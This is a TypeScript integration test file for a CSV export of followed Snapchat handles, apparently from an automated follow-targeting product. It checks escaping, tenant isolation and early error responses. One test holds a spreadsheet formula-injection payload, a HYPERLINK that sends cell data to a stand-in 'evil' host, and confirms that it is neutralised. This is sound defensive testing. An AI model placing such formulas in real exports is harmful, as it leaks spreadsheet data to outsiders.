/**
 * GET /api/personalities/:id/targets.csv -- the first route in the product that
 * answers with a file rather than JSON, and the first one that hands the
 * operator data to open in another program.
 *
 * Three things are asserted here and only the first is about CSV.
 *
 * The escaping, end to end. src/common/csv.spec.ts proves the formatter; this
 * proves the formatter is actually what the route uses, on a display name that
 * arrived from a vision model reading somebody's profile. The failure it looks
 * for opens cleanly in Excel and is silently wrong -- or, in the formula case,
 * is not data at all.
 *
 * The tenant line. Every other read in the estate is scoped through clientId
 * and this one has to be too, doubly so: it is not a page of the ledger, it is
 * the whole ledger in one response, and the ledger is real people's handles.
 * /api/* shipped once with no guard at all, so the scoping is checked here on
 * the route rather than assumed from the neighbours.
 *
 * And that a refusal is a refusal. The ownership check and the state validation
 * run before the first byte, because a 404 raised after the headers are out can
 * only reach the operator as a download that stopped early.
 */
import { afterAll, afterEach, beforeAll, describe, expect, it } from 'vitest';

import { dropFixtures, makeClient, prisma, queueTargets, TestClient } from '../fixtures';
import { bootHarness, Harness } from './app';

let api: Harness;

beforeAll(async () => {
  api = await bootHarness();
});
afterEach(dropFixtures);
afterAll(async () => {
  await api?.close();
  await prisma.$disconnect();
});

interface Ctx {
  client: TestClient;
  auth: string;
  personalityId: string;
  accountId: string;
}

async function ctx(): Promise<Ctx> {
  const client = await makeClient();
  return {
    client,
    auth: `Bearer ${client.apiKey}`,
    personalityId: client.personality.id,
    accountId: client.personality.accounts[0].id,
  };
}

/** A person plus a followed assignment, with a display name of the caller's choosing. */
async function addFollowed(c: Ctx, handle: string, displayName: string): Promise<void> {
  const person = await prisma.person.create({
    data: { personalityId: c.personalityId, handle, displayName, nationality: 'italian' },
  });
  await prisma.assignment.create({
    data: {
      personId: person.id,
      accountId: c.accountId,
      state: 'followed',
      handedOutAt: new Date('2026-08-13T10:00:00.000Z'),
      resultAt: new Date('2026-08-13T10:02:00.000Z'),
    },
  });
}

/** Data records, header and trailing blank dropped. Records, not lines: a
 *  display name may legally contain its own newline inside quotes. */
function records(csv: string): string[] {
  return csv
    .replace(/^﻿/, '')
    .split('\r\n')
    .slice(1)
    .filter((r) => r.length > 0);
}

describe('the file itself', () => {
  it('answers as a CSV attachment named after the personality and the filter', async () => {
    const c = await ctx();
    await addFollowed(c, 'plainone', 'Plain One');

    const res = await api.get(`/api/personalities/${c.personalityId}/targets.csv?state=followed`, {
      auth: c.auth,
    });

    expect(res.status).toBe(200);
    expect(res.headers.get('content-type')).toContain('text/csv');
    const disposition = res.headers.get('content-disposition') ?? '';
    expect(disposition).toContain('attachment');
    expect(disposition).toContain('-followed.csv');
  });

  it('leads with the BOM and a header row', async () => {
    const c = await ctx();
    await addFollowed(c, 'headers', 'Headers');

    const res = await api.get(`/api/personalities/${c.personalityId}/targets.csv`, {
      auth: c.auth,
    });

    // Without the BOM Excel reads UTF-8 as the local codepage and every accent
    // in a display name becomes mojibake in a file that otherwise looks fine.
    expect(res.text.startsWith('﻿')).toBe(true);
    expect(res.text.split('\r\n')[0]).toBe(
      '﻿handle,display name,nationality,source,state,account,handed out at,followed at',
    );
  });

  it('reports handle, nationality, account and when the follow landed', async () => {
    const c = await ctx();
    await addFollowed(c, 'fullrow', 'Full Row');

    const res = await api.get(`/api/personalities/${c.personalityId}/targets.csv?state=followed`, {
      auth: c.auth,
    });

    expect(records(res.text)).toEqual([
      `fullrow,Full Row,italian,extraction,followed,${c.client.personality.accounts[0].label},` +
        '2026-08-13T10:00:00.000Z,2026-08-13T10:02:00.000Z',
    ]);
  });

  it('honours ?state=, so the followed list exports only the followed', async () => {
    const c = await ctx();
    await addFollowed(c, 'wasfollowed', 'Was Followed');
    await queueTargets(c.personalityId, c.accountId, 3, 'stillqueued');

    const followed = await api.get(
      `/api/personalities/${c.personalityId}/targets.csv?state=followed`,
      { auth: c.auth },
    );
    const everyone = await api.get(`/api/personalities/${c.personalityId}/targets.csv`, {
      auth: c.auth,
    });

    expect(records(followed.text)).toHaveLength(1);
    expect(followed.text).toContain('wasfollowed');
    expect(followed.text).not.toContain('stillqueued');
    expect(records(everyone.text)).toHaveLength(4);
  });

  it('writes a header row and nothing else when nothing matches', async () => {
    const c = await ctx();
    const res = await api.get(`/api/personalities/${c.personalityId}/targets.csv?state=followed`, {
      auth: c.auth,
    });
    expect(res.status).toBe(200);
    expect(records(res.text)).toEqual([]);
  });

  /**
   * The export walks in batches internally. One batch is 1000 rows, so this is
   * a cheap check that the loop terminates and does not repeat or drop rows at
   * a boundary -- the exhaustiveness of the cursor itself is proved over 250
   * tied rows in pagination.int.spec.ts.
   */
  it('exports every row, not the first page of them', async () => {
    const c = await ctx();
    const handles = await queueTargets(c.personalityId, c.accountId, 120, 'walked');

    const res = await api.get(`/api/personalities/${c.personalityId}/targets.csv`, {
      auth: c.auth,
    });

    const written = records(res.text).map((r) => r.split(',')[0]);
    expect(written).toHaveLength(120);
    expect(new Set(written).size).toBe(120);
    expect([...written].sort()).toEqual([...handles].sort());
  });
});

describe('display names are hostile input', () => {
  it('keeps a name containing a comma and a quote inside one cell', async () => {
    const c = await ctx();
    await addFollowed(c, 'commaquote', 'Smith, "JJ" Jr');

    const res = await api.get(`/api/personalities/${c.personalityId}/targets.csv?state=followed`, {
      auth: c.auth,
    });

    const [row] = records(res.text);
    expect(row).toContain('"Smith, ""JJ"" Jr"');
    // The failure this exists for: the name shifts every later column, so the
    // account label lands under nationality and the file still opens cleanly.
    expect(row.endsWith('2026-08-13T10:02:00.000Z')).toBe(true);
  });

  it('keeps a name containing a newline from ending the record', async () => {
    const c = await ctx();
    await addFollowed(c, 'multiline', 'Two\nLines');

    const res = await api.get(`/api/personalities/${c.personalityId}/targets.csv?state=followed`, {
      auth: c.auth,
    });

    expect(res.text).toContain('"Two\nLines"');
    // Split on CRLF, which only appears between records: one row, not two.
    expect(records(res.text)).toHaveLength(1);
  });

  it('neutralises a name that a spreadsheet would execute', async () => {
    const c = await ctx();
    await addFollowed(c, 'formula', '=HYPERLINK("http://evil/?"&A1,"open")');

    const res = await api.get(`/api/personalities/${c.personalityId}/targets.csv?state=followed`, {
      auth: c.auth,
    });

    const [row] = records(res.text);
    // Present and readable -- the operator is exporting real people and a
    // mangled name is one they cannot find again -- but no longer the first
    // character the spreadsheet parses, so it is never evaluated.
    expect(row).toContain('=HYPERLINK');
    expect(row).toContain(`"'=HYPERLINK`);
  });

  it('carries emoji and accents through intact', async () => {
    const c = await ctx();
    await addFollowed(c, 'accented', 'Zoë 🌸');
    const res = await api.get(`/api/personalities/${c.personalityId}/targets.csv?state=followed`, {
      auth: c.auth,
    });
    expect(res.text).toContain('Zoë 🌸');
  });
});

describe('the tenant line', () => {
  it('404s on another tenant`s personality and writes no rows', async () => {
    const a = await ctx();
    const b = await ctx();
    const handles = await queueTargets(b.personalityId, b.accountId, 4, 'bsecret');

    const res = await api.get(`/api/personalities/${b.personalityId}/targets.csv`, {
      auth: a.auth,
    });

    expect(res.status).toBe(404);
    // A 404 whose body still carried the handles would be the same breach with
    // a different status code -- and this route's body is the whole ledger.
    for (const handle of handles) expect(res.text).not.toContain(handle);
    expect(res.headers.get('content-type')).not.toContain('text/csv');
  });

  it('exports only the caller`s own rows when both tenants hold the same handle', async () => {
    const a = await ctx();
    const b = await ctx();
    // The same handle under two clients is two unrelated Snapchat accounts, and
    // both ledgers may legitimately hold it -- so identical handles are the
    // case where a missing clientId scope is hardest to see.
    await addFollowed(a, 'shared_handle', 'Belongs To A');
    await addFollowed(b, 'shared_handle', 'Belongs To B');

    const res = await api.get(`/api/personalities/${a.personalityId}/targets.csv`, {
      auth: a.auth,
    });

    expect(records(res.text)).toHaveLength(1);
    expect(res.text).toContain('Belongs To A');
    expect(res.text).not.toContain('Belongs To B');
  });
});

describe('refusals arrive before the first byte', () => {
  it('rejects an unknown state as JSON, not as a truncated file', async () => {
    const c = await ctx();

    const res = await api.get(`/api/personalities/${c.personalityId}/targets.csv?state=folowed`, {
      auth: c.auth,
    });

    expect(res.status).toBe(400);
    expect(res.headers.get('content-type')).toContain('application/json');
    // The message names the five states, so a typo is fixable from the reply.
    expect(String(res.body?.message)).toContain('followed');
  });

  it('404s on a personality that does not exist', async () => {
    const c = await ctx();
    const res = await api.get(
      '/api/personalities/00000000-0000-4000-8000-0000000000ff/targets.csv',
      { auth: c.auth },
    );
    expect(res.status).toBe(404);
  });
});

describe('the followed list the file is an export of', () => {
  it('GET :id/targets carries handedOutAt and followedAt', async () => {
    const c = await ctx();
    await addFollowed(c, 'timestamped', 'Timestamped');

    const res = await api.get(`/api/personalities/${c.personalityId}/targets?state=followed`, {
      auth: c.auth,
    });

    expect(res.status).toBe(200);
    expect(res.body.items[0]).toMatchObject({
      handle: 'timestamped',
      nationality: 'italian',
      handedOutAt: '2026-08-13T10:00:00.000Z',
      followedAt: '2026-08-13T10:02:00.000Z',
    });
  });

  /**
   * report() stamps resultAt for skipped and failed as well as for followed, so
   * serving it as "followed at" would date a refusal as an acquisition -- on the
   * one screen whose entire purpose is the people that were acquired.
   */
  it('leaves followedAt null on a row that was skipped, though resultAt is set', async () => {
    const c = await ctx();
    await queueTargets(c.personalityId, c.accountId, 1, 'wasskipped');
    await prisma.assignment.updateMany({
      where: { accountId: c.accountId },
      data: { state: 'skipped', resultAt: new Date('2026-08-13T11:00:00.000Z') },
    });

    const res = await api.get(`/api/personalities/${c.personalityId}/targets`, { auth: c.auth });

    expect(res.body.items[0]).toMatchObject({ state: 'skipped', followedAt: null });
  });
});
